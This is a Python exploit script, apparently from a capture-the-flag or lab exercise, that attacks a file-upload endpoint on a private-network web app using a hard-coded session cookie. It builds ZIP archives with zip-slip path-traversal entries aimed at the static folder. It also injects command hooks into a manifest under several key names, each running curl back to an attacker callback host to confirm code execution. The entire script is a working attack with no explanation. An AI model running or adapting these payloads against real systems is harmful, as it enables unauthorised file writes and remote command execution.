import requests, zipfile, os, time
TARGET="http://10.65.146.116:5000"
S="eyJzdGFmZiI6ImNvbmNpZXJnZSJ9.apJuOQ.yWRtVVvgsw0Qk9NzdbGSakknWXI"
CALLBACK="192.168.134.200"
cookies={"session":S}

def up(name, files):
    z=f"{name}.zip"
    with zipfile.ZipFile(z,"w") as zf:
        for k,v in files.items(): zf.writestr(k,v)
    with open(z,"rb") as f:
        return requests.post(f"{TARGET}/upload", files={"shell":(z,f,"application/zip")}, cookies=cookies)

base={"shell.json":'{"assets":["a.png"]}', "a.png":"x"}

# ZIP SLIP: try many traversal depths targeting static folder
slip={}
for d in range(1,12):
    slip["../"*d + "static/pwn.txt"] = f"pwned-depth{d}"
files=dict(base); files.update(slip)
print("slip status:", up("slip", files).status_code)

# HOOK OOB via curl-back, several key names
for key in ["hook","hooks","automation","setup","run","on_load","post_install"]:
    m='{"assets":["a.png"], "%s":"curl http://%s:8000/%s"}' % (key, CALLBACK, key)
    print(f"hook[{key}] status:", up(f"hook_{key}", {"shell.json":m, "a.png":"x"}).status_code)

time.sleep(3)
print("=== GET /static/pwn.txt ===")
r=requests.get(f"{TARGET}/static/pwn.txt")
print(r.status_code, repr(r.text[:80]))
